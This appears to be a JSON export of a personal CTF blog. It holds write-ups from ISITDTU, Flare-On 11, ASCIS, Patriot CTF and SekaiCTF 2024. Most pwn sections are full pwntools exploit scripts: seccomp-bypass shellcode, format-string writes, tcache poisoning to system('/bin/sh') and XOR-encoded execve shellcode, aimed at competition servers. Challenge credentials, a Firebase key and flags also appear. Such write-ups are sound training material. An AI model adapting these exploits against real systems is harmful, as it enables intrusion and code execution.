[{"content":"Pwn shellcode 1 Analysis It\u0026rsquo;a Shellcoding Challenge with a seccomp filter.\n# line CODE JT JF K\r# =================================\r# 0000: 0x20 0x00 0x00 0x00000004 A = arch\r# 0001: 0x15 0x00 0x0a 0xc000003e if (A != ARCH_X86_64) goto 0012\r# 0002: 0x20 0x00 0x00 0x00000000 A = sys_number\r# 0003: 0x35 0x00 0x01 0x40000000 if (A \u0026lt; 0x40000000) goto 0005\r# 0004: 0x15 0x00 0x07 0xffffffff if (A != 0xffffffff) goto 0012\r# 0005: 0x15 0x06 0x00 0x00000000 if (A == read) goto 0012\r# 0006: 0x15 0x05 0x00 0x00000001 if (A == write) goto 0012\r# 0007: 0x15 0x04 0x00 0x00000002 if (A == open) goto 0012\r# 0008: 0x15 0x03 0x00 0x0000003b if (A == execve) goto 0012\r# 0009: 0x15 0x02 0x00 0x000000f0 if (A == mq_open) goto 0012\r# 0010: 0x15 0x01 0x00 0x00000101 if (A == openat) goto 0012\r# 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW\r# 0012: 0x06 0x00 0x00 0x00000000 return KILL open, read, write, execve syscall is blocked.\nHowever, this can be easily bypassed with the preadv2, pwritev2 syscalls.\nAnalyze the Challenge binary, you can see that it reads the contents from the flag file and copies them to the memory allocated with mmap. After that, it allocates executable memory again with mmap, copies the user\u0026rsquo;s shellcode, and executes it.\nSince the memory area where the flag contents are stored is adjacent, I gave a huge number as an argument to pwritev2 and was able to obtain the flag from the output.\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 from pwn import * context.arch = \u0026#39;amd64\u0026#39; context.os = \u0026#39;linux\u0026#39; context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] # p = process(\u0026#34;./challenge\u0026#34;) p = remote(\u0026#34;152.69.210.130\u0026#34;, 3001) p.recvuntil(b\u0026#34;: \u0026#34;) libc_base = int(p.recvline().strip(),16) - 0x606f0 # need to change? log.info(f\u0026#34;libc_base: {hex(libc_base)}\u0026#34;) sc = \u0026#39;\u0026#39;\u0026#39; mov rax, 0x147 mov rdi, 3 mov r10, rdx mov rdx, 0x1 mov [rsi], rdx addq [rsi], 0x8 mov [rsi+0x8], r10 addq [rsi+0x8], 0x18 movq [rsi+0x10], 0x10000 add rsi, 0x8 mov r10, 0 mov r8, 0 mov r9, 0 syscall mov rax, 0x148 mov rdi, 0x1 mov rdx, 0x1 mov r10, -1 mov r8, -1 syscall \u0026#39;\u0026#39;\u0026#39; sc = asm(sc) p.sendline(sc) p.interactive() Flag: ISITDTU{061e8c26e3cf9bfad4e22879994048c8257b17d8}\nshellcode 2 Analysis Another Shellcoding Challenge. But this time we have to input shellcode with odd number.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int __fastcall main(int argc, const char **argv, const char **envp) { int i; // [rsp+Ch] [rbp-4h] init(argc, argv, envp); read_flag(); addr = mmap((void *)0xAABBCC00LL, 0x1000uLL, 7, 34, -1, 0LL); if ( addr == (void *)-1LL ) { perror(\u0026#34;mmap\u0026#34;); return 1; } else { puts(\u0026#34;\u0026gt;\u0026#34;); read(0, addr, 0x1000uLL); for ( i = 0; i \u0026lt;= 4095; ++i ) { if ( (*((_BYTE *)addr + i) \u0026amp; 1) == 0 ) *((_BYTE *)addr + i) = -112; } ((void (*)(void))addr)(); return 0; } } It filter even number byte and make it to \\x90 byte which mean nop instruction.\nI searched and found a way to generate odd byte shellcode via r11d register and was able to solve it by calculating the location of flag global variable via register and then calling write syscall.\nExploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 from pwn import * # p = process(\u0026#39;./challenge\u0026#39;) p =remote(\u0026#39;152.69.210.130\u0026#39;, 3002) context.arch = \u0026#39;amd64\u0026#39; context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] context.log_level = \u0026#39;debug\u0026#39; # sleep(1) sc = \u0026#39;\u0026#39;\u0026#39; mov r11d, 0x13091309 shr r11, 15 shr r11, 1 sub r13, r11 mov r11d, 0xfffffff1 sub r11d, 0xffffbfb1 add r13, r11 push r13 mov r11d, 0xfffffff1 sub r11d, 0xffffd339 sub r13, r11 pop rdi call r13 \u0026#39;\u0026#39;\u0026#39; sc = asm(sc) # gdb.attach(p, \u0026#39;\u0026#39;\u0026#39; # brva 0x13fd # \u0026#39;\u0026#39;\u0026#39;) p.sendline(sc) p.interactive() Flag: ISITDTU{95acf3a6b3e1afc243fbad70fbd60a6be00541c62c6d651d1c10179b41113bda}\n","description":"CTF end of the Year 2024","id":0,"section":"posts","tags":["ctf","pwn","shellcode","writeups"],"title":"Duy Tan University CTF 2024","uri":"https://duythucne22.github.io/posts/2024/isitdtuctf2024quals/"},{"content":"First time playing flare on, alone :(, and this happen during my midterm exam , so dont really have much time playing it, just manage to solve up to challenge 5 still stuck a little there, I\u0026rsquo;m so noob, gonna try harder next time.\nChallenge 1 – frog The source code :\n1 2 3 4 5 # are they on the victory tile? if so do victory if player.x == victory_tile.x and player.y == victory_tile.y: victory_mode = True flag_text = GenerateFlagText(player.x, player.y) flag_text_surface = flagfont. render(flag_text, False , pygame.Color( \u0026#39;black\u0026#39; )) print ( \u0026#34;%s\u0026#34; % flag_text) when reach (10,10) you can get the flag.\n1 victory_tile = pygame.Vector2( 10 , 10 ) Move the frog there and past that block, you will get the flag.\nChallenge 2 - checksum Key get xor with FlareOn 2024 , so we need to reverse here\n1 2 3 4 5 6 7 from pwn import xor import base64 f = base64.b64decode( \u0026#34;cQoFRQErX1YAVw1zVQdFUSxfAQNRBXUNAxBSe15QCVRVJ1pQEwd/WFBUAlElCFBFUnlaB1ULByRdBEFdfVtWVA==\u0026#34; ) b = \u0026#34;FlareOn2024\u0026#34; print (xor(f, b)) Decrypt it, we get the checksum: 7fd7dd1d0e959f74c133c13abb740b9faa61ab06bd0ecd177645e93b1e3825dd\nAfter decrypting the flag, flag content will be stored in UserCacheDir in the form of a JPG image.\nChallenge 3 - aray This question is a yara rule file, which is a bit messy. I will first write a script to dump my conditions and sort them.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 file_size filesize == 85 0 uint8(0) % 25 \u0026lt; 25 filesize ^ uint8(0) != 16 filesize ^ uint8(0) != 41 uint8(0) \u0026amp; 128 == 0 uint8(0) \u0026lt; 129 uint8(0 ) \u0026gt; 30 1 uint8(1) \u0026gt; 19 uint8(1) % 17 \u0026lt; 17 uint8(1) \u0026amp; 128 == 0 uint8(1) \u0026lt; 158 filesize ^ uint8(1) != 232 filesize ^ uint8(1) != 0 2 filesize ^ uint8(2) != 205 filesize ^ uint8(2) != 54 uint8(2) % 28 \u0026lt; 28 uint8(2) + 11 == 119 uint8(2) \u0026gt; 20 ... Now, before reverse the encryption functions, we need to understand what these functions are doing.\nFunction Mean uint8(x) A byte, x is the index uint32(x) Four bytes, representing [x:x+4] hash.md5(x,y) Stands for [x:x+y]md5 hash.crc32(x,y) Stands for [x:x+y]crc32 hash.sha256(x,y) Represents [x:x+y]sha256 As long as we find a string with a length of 85 that meets the above conditions, the flag\nwill encounter problems at the beginning of the restoration. The conditions given by uint8 are too few. Basically all printable chars of uint8 will meet the requirements,\nso we need to do the hash restoration first. , only two bytes are directly exploded\nsha256\n1 2 3 4 5 6 7 8 9 10 11 import hashlib import itertools target_hash = \u0026#34;593f2d04aab251f60c9e4b8bbc1e05a34e920980ec08351a18459b2bc7dbf2f6\u0026#34; for candidate in itertools.product( map ( chr , range ( 32 , 127 )), repeat= 2 ): input_string = \u0026#39;\u0026#39; .join(candidate) sha256_hash = hashlib.sha256(input_string.encode()).hexdigest() if sha256_hash == target_hash: print ( f \u0026#34; {input_string} \u0026#34; ) break do similar for md5, crc32, which we brute for each 2 bytes.\nBy then you craft all you condition back together, this the 85 bytes long when we decrypted:\nrule flareon { strings: $f = \u0026#34;1RuleADayK33p$Malw4r3Aw4y@flare-on.com\u0026#34; condition: $f } I got some word wrong originally, when use Z3 , however i manage to try changing some words since seeing the meaning of it 1RuleADayK33p$Malw4r3Aw4y@flare-on.com\nChallenge 4 - FLARE Meme Maker 30003000 Meme generator written in Javascript that generates memes with canned messages relating to FLARE-ON or just Reverse Engineering and Hacking itself.\nOrientation It always blows my mind how many stupid things are allowed in Javascript, makes me wonder if we didn\u0026rsquo;t just make a huge mistake inventing it. But I digress\u0026hellip;\nVisual Studio Code can format code for us just fine:\nReally? You only added spaces? That\u0026rsquo;s all the Microsoft money could do? Thanks VSCode for being pretty much completely useless here\u0026hellip;\nLuckily, Firefox\u0026rsquo;s developer tools proves itself to be much more useful:\nFrom here on I tried using more online deobfuscators, but it always resulted in either Firefox crashing (probably due to the amount of code), or just simply not working.\nThus, I decided to take matters in my own hands, and just go with what I had ended up with now after formatting.\nFormatted file can be found in mememaker3000.formatted.html\nMaking Sense of the Mess The formatted code is quite a bit of a mess still, but actually not that difficult to understand, provided you know where to look!\nI worked under the assumption that, because there are buttons and textboxes that do something, then there must be a click or keyup event registered somewhere.\nTurns out, this happens at the very end of the script, starting at line 101511:\nYou may wonder, how do I know these are event listener setups?\nThe nice thing about Javascript loaded on a webpage is that you can pull up your browser\u0026rsquo;s console window, and just copy/paste all the obfuscated code to have the program decrypt itself.\nSubstituting the strings, makes it pretty clear to read:\nThe function that is called on every key press in a textbox is a0k.\nLet\u0026rsquo;s have a look at it:\nAgain, with a very similar trick, we can simply deobfuscate all the obfuscated strings:\nAfter substituting the strings, we get the following:\nThere are a few magic variables here, but with a bit of trial and error and more Javascript console abuse, you can easily figure out the meaning behind each variable:\nVariable Description a0g Current Selected Image a0e All Templates a0l First text box a0m Second text box a0n Third text box a0c Array of canned meme messages This tells us two things.\nFirst, the first if statement tells us which meme template we must use:\n1 if (a !== Object[\u0026#34;keys\u0026#34;](a0e) [5]) return; The second if statement tells use what to put in the three text boxes:\n1 2 3 4 5 if ( a0c[\u0026#39;indexOf\u0026#39;](b) == 14 \u0026amp;\u0026amp; a0c[\u0026#39;indexOf\u0026#39;](c) == a0c[\u0026#39;length\u0026#39;] - 1 \u0026amp;\u0026amp; a0c[\u0026#39;indexOf\u0026#39;](d) == 22 ) { Getting the Flag One final time to the Javascript console to get all the info we need:\nFollowing these guidelines\u0026hellip;\n\u0026hellip; reveals the flag!\ntitle: 5 - sshd\nlayout: default 5 - sshd This challenge is kinda new to me , and took very long.\nYou are presented with a file dump of a docker image called ssh_container.\nThe story is that a server running this image crashed and you need to figure out what happened.\n(i will try to uodate later)\n","description":"Flare On 11 2024 Writeup","id":1,"section":"posts","tags":["ctf","Rev","flare on"],"title":"Flare On 11","uri":"https://duythucne22.github.io/posts/2024/flareon11/"},{"content":"(I will Update, redo later if i am free :)) )\nA little sad that i was on other team, and the Quals did not got any pwn challenge, so just help the other team to get Khuyen Khich award heehe:))\nRun 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 #!/usr/bin/python3 from pwn import * exe = ELF(\u0026#39;chall\u0026#39;, checksec=False) context.binary = exe info = lambda msg: log.info(msg) sla = lambda msg, data: p.sendlineafter(msg, data) sa = lambda msg, data: p.sendafter(msg, data) sl = lambda data: p.sendline(data) s = lambda data: p.send(data) sln = lambda msg, num: sla(msg, str(num).encode()) sn = lambda msg, num: sa(msg, str(num).encode()) def GDB(): if not args.REMOTE: gdb.attach(p, gdbscript=\u0026#39;\u0026#39;\u0026#39; b main+331 bsecret_lab+47 c \u0026#39;\u0026#39;\u0026#39;) input() if args.REMOTE: p = remote( \u0026#39;183.91.11.30\u0026#39;, 1969) else: p = process(exe.path) GDB() Select Menu Option 1 (Enter Coordinates) sla(b\u0026#34;Enter your choice: \u0026#34;, b\u0026#34;1\u0026#34;) Craft the payload payload = b\u0026#34;A\u0026#34; * 72 payload += p64(0x40135a+1) Send payload to trigger the overflow p.recvuntil(b\u0026#39;Enter quantum coordinates: \u0026#39;) sl(payload) p.recvuntil(b\u0026#34;Enter the secret lab password: \u0026#34;) sl(b\u0026#34;qu4ntumR3ality\u0026#34;) p.interactive() BugBounty This challenge i was able to leak libc, but time ended\ni thought after leak libc, we gonna craft our shell or jump to a win function but that name wasn\u0026rsquo;t , instead other solve suggest using tcache poisoning which i have think about that\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 from pwn import * exe = ELF(\u0026#39;chall_patched\u0026#39;, checksec=False) libc = ELF(\u0026#39;libc.so.6\u0026#39;, checksec=False) context.binary = exe info = lambda msg: log.info(msg) s = lambda data: p.send(data) sa = lambda msg, data: p.sendafter(msg, data) sl = lambda data: p.sendline(data) sla = lambda msg, data: p.sendlineafter(msg, data) sn = lambda msg, num: sa(msg, str(num).encode()) sna = lambda msg, num: p.sendafter(msg, str(num).encode()) sln = lambda msg, num: sla(msg, str(num).encode()) slna = lambda msg, num: p.sendlineafter(msg, str(num).encode()) def add_note(idx, size, data): slna(p, b\u0026#39;: \u0026#39;, 1) slna(p, b\u0026#39;: \u0026#39;, idx) slna(p, b\u0026#39;: \u0026#39;, size) def delete_note(idx): slna(p, b\u0026#39;: \u0026#39;, 2) slna(p, b\u0026#39;: \u0026#39;, idx) def write_note(idx, size, data): slna(p, b\u0026#39;: \u0026#39;, 3) slna(p, b\u0026#39;: \u0026#39;, idx) slna(p, b\u0026#39;: \u0026#39;, size) def print_note(idx): slna(p, b\u0026#39;: \u0026#39;, 4) slna(p, b\u0026#39;: \u0026#39;, idx) def GDB(): if not args.REMOTE: gdb.attach(p, gdbscript=\u0026#39;\u0026#39;\u0026#39; c \u0026#39;\u0026#39;\u0026#39;) input() if args.REMOTE: p = remote(\u0026#39;\u0026#39;) else: p = process(exe.path) GDB() # Leak heap add_note(0, 0x500) add_note(1, 0x48) add_note(2, 0x48) add_note(3, 0x48) delete_note(0) delete_note(1) delete_note(2) print_note(0) p.recvuntil(b\u0026#39;Data: \u0026#39;) libc_leak = u64(p.recv(6) + b\u0026#39;\\0\\0\u0026#39;) libc.address = libc_leak - 0x21ace0 info(\u0026#34;Libc leak: \u0026#34; + hex(libc_leak)) info(\u0026#34;Libc base: \u0026#34; + hex(libc.address)) print_note(3) p.recvuntil(b\u0026#39;Data: \u0026#39;) heap_leak = u64(p.recv(5) + b\u0026#39;\\0\\0\\0\u0026#39;) heap_base = heap_leak \u0026lt;\u0026lt; 12 info(\u0026#34;Heap leak: \u0026#34; + hex(heap_leak)) info(\u0026#34;Heap base: \u0026#34; + hex(heap_base)) # Tcache poisoning write_note(2, 0x27, p64(((heap_base + 0x9c0) \u0026gt;\u0026gt; 12) ^ (libc.address + 0x21a070) )) add_note(2, 0x48) add_note(3, 0x48) write_note(3, 0x47, b\u0026#39;/bin/sh\\0\u0026#39;.ljust(0x28, b\u0026#39;\\0\u0026#39;) + p64(libc.sym.system)) print_note(3) p.interactive() ","description":"Final ASCIS 2024, pwn writeup","id":2,"section":"posts","tags":["ctf","pwn","writeups"],"title":"ATTTSV 2024","uri":"https://duythucne22.github.io/posts/2024/ascis2024/"},{"content":"shrimple strings only 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from pwn import * def malloc(): p.sendline(b\u0026#39;1\u0026#39;) p.sendlineafter(b\u0026#34;Size \u0026gt; \u0026#34;, b\u0026#39;16\u0026#39;) p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def write(idx, string): p.sendline(b\u0026#39;2\u0026#39;) p.sendlineafter(b\u0026#39;Index \u0026gt; \u0026#39;, idx) p.sendlineafter(b\u0026#39;String \u0026gt; \u0026#39;, string) p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) def read(idx, leak = 0): p.sendline(b\u0026#39;3\u0026#39;) p.sendlineafter(b\u0026#39;Index \u0026gt; \u0026#39;, idx) meow = \u0026#39;\u0026#39; if leak == 1: meow = p64(int(p.recvline().decode().lstrip(\u0026#39;0x\u0026#39;), 16) - 0xf0) p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) return meow #p = process(\u0026#39;./strings_only\u0026#39;) p = remote(\u0026#39;chal.competitivecyber.club\u0026#39;, 8888) #stage 1: leaking the stack add malloc() write(b\u0026#39;0\u0026#39;, b\u0026#39;%15$p\u0026#39;) stack_add = read(b\u0026#39;0\u0026#39;, 1) #stage 2: writing the address of strings on itself write(b\u0026#39;0\u0026#39;, b\u0026#39;%2117056c%6$n\u0026#39;) read(b\u0026#39;0\u0026#39;) #stage 3: writing the address of stack in strings write(b\u0026#39;0\u0026#39;, stack_add) #stage 4: writing the 0xcafebabe on stack write(b\u0026#39;0\u0026#39;, p64(0xcafebabe)) #stage 5: flag!!! p.sendline(b\u0026#39;5\u0026#39;) p.interactive() p.close() shellcrunch 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 from pwn import * bin = \u0026#39;./shellcrunch\u0026#39; elf = context.binary = ELF(bin) #p = process(bin) p = remote(\u0026#39;chal.competitivecyber.club\u0026#39;, 3004) #Xor encrypt it so it can be decrypted def xor_bytes(buffer, length): new_buffer = list(buffer) for i in range(0, length - 1, 4): new_buffer[i] = new_buffer[i] ^ new_buffer[i + 1] return bytes(new_buffer) #starting at 2, every 12 bytes the first 4 are trash - 6 bytes at each level shellcode = asm(\u0026#39;\u0026#39;\u0026#39; jmp $+6 nop nop nop ret mov al, 0x20 #2 bytes xor al, 0x48 #2 bytes nop nop jmp $+6 nop nop nop ret shl rax, 8 #4 bytes mov al, 0x33 #2 bytes jmp $+6 nop nop nop ret xor al, 0x40 #2 bytes shl rax, 8 #4 bytes jmp $+6 nop nop nop ret mov al, 0x0F #2 bytes xor al, 0x20 #2 bytes nop nop jmp $+6 nop nop nop ret shl rax, 8 #4 bytes mov al, 0x2E #2 bytes jmp $+6 nop nop nop ret xor al, 0x40 #2 bytes shl rax, 8 #4 bytes jmp $+6 nop nop nop ret mov al, 0x29 #2 bytes xor al, 0x40 #2 bytes nop nop jmp $+6 nop nop nop ret shl rax, 8 #4 bytes mov al, 0x20 #2 bytes jmp $+6 nop nop nop ret xor al, 0x42 #2 bytes shl rax, 8 #4 bytes jmp $+6 nop nop nop ret mov al, 0x0F #2 bytes xor al, 0x20 #2 bytes push rax nop jmp $+6 nop nop nop ret xor rsi, rsi xor rdx, rdx jmp $+6 nop nop nop ret xor rax, rax mov rdi, rsp jmp $+6 nop nop nop ret xor al, 0x1b xor al, 0x20 syscall \u0026#39;\u0026#39;\u0026#39;) length = len(shellcode) log.info(f\u0026#39;Length {length}\u0026#39;) payload = (xor_bytes(shellcode, length)) p.sendlineafter(b\u0026#39;Enter shellcode:\u0026#39;, (payload)) p.interactive() #pctf{x0r_fu_1s_str0ng} ","description":"Pwn writeup patriot ctf 2024","id":3,"section":"posts","tags":["ctf","pwn","writeups"],"title":"Patriot CTF 2024","uri":"https://duythucne22.github.io/posts/2024/patriotctf2024/"},{"content":"Crack Me Developed for SekaiCTF 2022 but never got a chance to release it. Can you log in and claim the flag?\rCrack Me is an android application that asks for a email and password.\nExploit When opening the app we are greeting with a login screen:\nInspecting the internals of the app with jadx shows us in com.SekaiCTF.CrackMe.MainApplication that we are dealing with a ReactNative application.\nTime to look for the JavaScript\u0026hellip; which we can find in the assets/index.android.bundle file.\nIt is initially unreadable but just running it through a unminify program is enough to understand the internals.\nSearching for the string \u0026ldquo;admin\u0026rdquo; we get the most interesting code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 t.setState({ verifying: !0 }); var n = (0, k.initializeApp)(T.default), o = (0, A.getDatabase)(n); \u0026#34;admin@sekai.team\u0026#34; !== t.state.email || !1 === e.validatePassword(t.state.password) ? console.log(\u0026#34;Not an admin account.\u0026#34;) : console.log(\u0026#34;You are an admin...This could be useful.\u0026#34;); var s = (0, M.getAuth)(n); (0, M.signInWithEmailAndPassword)(s, t.state.email, t.state.password).then(function(e) { t.setState({ verifying: !1 }); var n = (0, A.ref)(o, \u0026#34;users/\u0026#34; + e.user.uid + \u0026#39;/flag\u0026#39;); (0, A.onValue)(n, function() { t.setState({ verifying: !1 }), t.setState({ errorTitle: \u0026#34;Hello Admin\u0026#34;, errorMessage: \u0026#34;Keep digging, you\u0026#39;re almost there!\u0026#34; }), t.AlertPro.open() }) }).catch(function(e) { [...] }) So the admin email is admin@sekai.team. Following the password validation:\n1 2 3 4 5 6 7 8 e.validatePassword = function(e) { if (17 !== e.length) return !1; var t = R.default.enc.Utf8.parse(b.default.KEY), n = R.default.enc.Utf8.parse(b.default.IV); return \u0026#34;03afaa672ff078c63d5bdb0ea08be12b09ea53ea822cd2acef36da5b279b9524\u0026#34; === R.default.AES.encrypt(e, t, { iv: n }).ciphertext.toString(R.default.enc.Hex) } After searching for the constants used here:\n1 2 3 4 5 6 7 8 9 10 var _ = { LOGIN: \u0026#34;LOGIN\u0026#34;, EMAIL_PLACEHOLDER: \u0026#34;user@sekai.team\u0026#34;, PASSWORD_PLACEHOLDER: \u0026#34;password\u0026#34;, BEGIN: \u0026#34;CRACKME\u0026#34;, SIGNUP: \u0026#34;SIGN UP\u0026#34;, LOGOUT: \u0026#34;LOGOUT\u0026#34;, KEY: \u0026#34;react_native_expo_version_47.0.0\u0026#34;, IV: \u0026#34;__sekaictf2023__\u0026#34; }; Decrypting the password gives us s3cr3t_SEKAI_P@ss\nEntering these credentials gives us a popup with Hello Admin Keep digging, you're almost there!.\nWhat we need to do is read out the flag value ourself with the credentials from the javascript file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import json import pyrebase config = { \u0026#34;apiKey\u0026#34;: \u0026#34;AIzaSyCR2Al5_9U5j6UOhqu0HCDS0jhpYfa2Wgk\u0026#34;, \u0026#34;authDomain\u0026#34;: \u0026#34;crackme-1b52a.firebaseapp.com\u0026#34;, \u0026#34;databaseURL\u0026#34;: \u0026#34;https://crackme-1b52a-default-rtdb.firebaseio.com\u0026#34;, \u0026#34;storageBucket\u0026#34;: \u0026#34;crackme-1b52a.appspot.com\u0026#34; } firebase = pyrebase.initialize_app(config) auth = firebase.auth() user = auth.sign_in_with_email_and_password(\u0026#34;admin@sekai.team\u0026#34;, \u0026#34;s3cr3t_SEKAI_P@ss\u0026#34;) uid = user.get(\u0026#34;localId\u0026#34;) db = firebase.database() path = db.child(\u0026#34;users\u0026#34;).child(uid).child(\u0026#34;flag\u0026#34;) print(path.get(user[\u0026#39;idToken\u0026#39;]).val()) Flag: SEKAI{15_React_N@71v3_R3v3rs3_H@RD???}\nX64 Extension I think implementing Crypto in assembly will make stuff run faster so why not do so?\rIn X64 Extension we are a given a statically linked linux binary that using AES-NI encrypts a \u0026ldquo;flag.txt\u0026rdquo; to a \u0026ldquo;flag.txt.enc\u0026rdquo;.\nWe are given an encrypted file and are suppost to decrypt it.\nExploit Searching for the file names of \u0026ldquo;flag.txt\u0026rdquo; / \u0026ldquo;flag.txt.enc\u0026rdquo; reveals the main function of the binary at address 0x4048f7.\nFrom there it is possible to make out that the program is opening \u0026ldquo;flag.txt\u0026rdquo;, reading it, doing something with it and a buffer of size 0xa0 and writing that buffer to \u0026ldquo;flag.txt.enc\u0026rdquo;.\nStarting at address 0x404519 we have our AES Encrypt:\nNotable is that before the AES Encryption a XOR with a buffer happens which contains the previous encrypted block (or the IV in the first iteration), so the program operates in Cipher Block Chaining mode.\nPlacing a breakpoint before that pxor at 0x404616 and reading it gives us the IV of fffefdfcfbfaf9f8f7f6f5f4f3f2f1f0\n\u0026gt; p/x $xmm1\r$1 = {\rv8_bfloat16 = {0xfeff, 0xfcfd, 0xfafb, 0xf8f9, 0xf6f7, 0xf4f5, 0xf2f3, 0xf0f1},\rv8_half = {0xfeff, 0xfcfd, 0xfafb, 0xf8f9, 0xf6f7, 0xf4f5, 0xf2f3, 0xf0f1},\rv4_float = {0xfcfdfeff, 0xf8f9fafb, 0xf4f5f6f7, 0xf0f1f2f3},\rv2_double = {0xf8f9fafbfcfdfeff, 0xf0f1f2f3f4f5f6f7},\rv16_int8 = {0xff, 0xfe, 0xfd, 0xfc, 0xfb, 0xfa, 0xf9, 0xf8, 0xf7, 0xf6, 0xf5, 0xf4, 0xf3, 0xf2, 0xf1, 0xf0},\rv8_int16 = {0xfeff, 0xfcfd, 0xfafb, 0xf8f9, 0xf6f7, 0xf4f5, 0xf2f3, 0xf0f1},\rv4_int32 = {0xfcfdfeff, 0xf8f9fafb, 0xf4f5f6f7, 0xf0f1f2f3},\rv2_int64 = {0xf8f9fafbfcfdfeff, 0xf0f1f2f3f4f5f6f7},\ruint128 = 0xf0f1f2f3f4f5f6f7f8f9fafbfcfdfeff\r} Similarly we can extract the key at the start of the key expansion at 0x4046f7 and get 000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f.\nThe code implementation of the actual AES-256 follows very close to the official intel guide.\nNotable is that different round constants were used for the aeskeygenassist instructions so standard AES-256 will not work the same.\n1 2 3 4 5 6 pyaes.AES.rcon = [ 0x13, 0x33, 0x37, 0xba, 0xda, 0x55, 0x66] aes = pyaes.AESModeOfOperationCBC(KEY, iv=IV) decrypted = b\u0026#39;\u0026#39; for i in range(len(CIPHERTEXT)//16): decrypted += aes.decrypt(CIPHERTEXT[16*i:16*(i+1)]) print(decrypted) Flag is inside the return content:\nHey Sekai CTF Player, I hope you are fine and are enjoying the CTF.\rKeep going, here is your reward!\rThe flag is SEKAI{Pl34Se_It\u0026#39;5_jUs7_@_wAaaarmUp} nolibc No libc means no vulnerability right?!\rRecon The program provides user registration and login functionality. After logging in, users can:\n1.Create strings (size 0x0-0x100)\n2.Delete strings\n3.View strings\n4.Save strings to file\n5.Load strings from file\n6.The malloc implementation uses a simple freed list sorted by increasing size. Each chunk has this structure:\nsize ptr to next chunk\r0x0000000000000020 0x000055555555d080\r[data...] Key observations:\nforest_chunk is initialized at start of writable segment with size 0x10000\nGlobal values like syscall numbers are stored right after forest_chunk\nSize field doesn\u0026rsquo;t include header size, leading to potential 0x10 overflow\nExploit We can overflow forest_chunk to overwrite syscall numbers by:\nRegister and login\nCreate 0xbf chunks of size 0xef to fill heap\nCreate final chunk with payload to overwrite syscall numbers:\n1 2 3 4 5 6 payload = b\u0026#34;a\u0026#34;*0x70 payload += p32(0x0) # read syscall payload += p32(0x1) # write syscall payload += p32(0x3b) # execve syscall payload += p32(0x3) # close syscall create_string(0x7f, payload) Delete a string to make space for filename malloc\nCall load_strings_from_file with /bin/sh to trigger execve\nHere\u0026rsquo;s the complete exploit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 from pwn import * exe = ELF(\u0026#34;./main\u0026#34;) context.binary = exe info = lambda msg: log.info(msg) s = lambda data: p.send(data) sa = lambda msg, data: p.sendafter(msg, data) sl = lambda data: p.sendline(data) sla = lambda msg, data: p.sendlineafter(msg, data) sn = lambda num: p.send(str(num).encode()) sna = lambda msg, num: p.sendafter(msg, str(num).encode()) sln = lambda num: p.sendline(str(num).encode()) slna = lambda msg, num: p.sendlineafter(msg, str(num).encode()) def GDB(): if not args.REMOTE: gdb.attach(p, gdbscript=\u0026#39;\u0026#39;\u0026#39; c \u0026#39;\u0026#39;\u0026#39;) input() if args.REMOTE: p = remote(\u0026#34;nolibc.chals.sekai.team\u0026#34;, 1337) else: p = process([exe.path]) GDB() def create_string(size: int, data: bytes): sla(b\u0026#34;Choose an option\u0026#34;, b\u0026#34;1\u0026#34;) sla(b\u0026#34;Enter string length:\u0026#34;, str(size).encode()) sla(b\u0026#34;string:\u0026#34;, data) def delete_string(idx: int): sla(b\u0026#34;Choose an option\u0026#34;, b\u0026#34;2\u0026#34;) sla(b\u0026#34;string to delete:\u0026#34;, str(idx).encode()) # Register and login sla(b\u0026#34;Choose an option\u0026#34;, b\u0026#34;2\u0026#34;) sla(b\u0026#34;Username:\u0026#34;, b\u0026#34;samuzora\u0026#34;) sla(b\u0026#34;Password:\u0026#34;, b\u0026#34;password\u0026#34;) sla(b\u0026#34;Choose an option\u0026#34;, b\u0026#34;1\u0026#34;) sla(b\u0026#34;Username:\u0026#34;, b\u0026#34;samuzora\u0026#34;) sla(b\u0026#34;Password:\u0026#34;, b\u0026#34;password\u0026#34;) # Fill heap with chunks for i in range(0xbf): print(i) create_string(0xef, b\u0026#34;asdf\u0026#34;) # Overflow to overwrite syscall numbers payload = b\u0026#34;a\u0026#34;*0x70 payload += p32(0x0) # read payload += 